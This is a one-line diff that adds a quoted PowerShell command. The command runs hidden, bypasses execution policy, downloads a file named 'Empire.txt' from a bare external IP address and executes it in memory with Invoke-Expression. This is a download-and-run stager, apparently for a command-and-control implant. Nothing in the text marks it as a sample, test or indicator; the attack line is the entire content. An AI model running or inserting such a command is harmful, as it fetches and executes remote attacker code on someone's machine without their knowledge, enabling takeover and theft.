@@ -1,0 +1,1 @@
+"powershell.exe -NoP -NonI -w hidden -Exec bypass Invoke-WebRequest 'http://34.213.170.51/PS_Bot/Empire.txt' | Invoke-Expression"
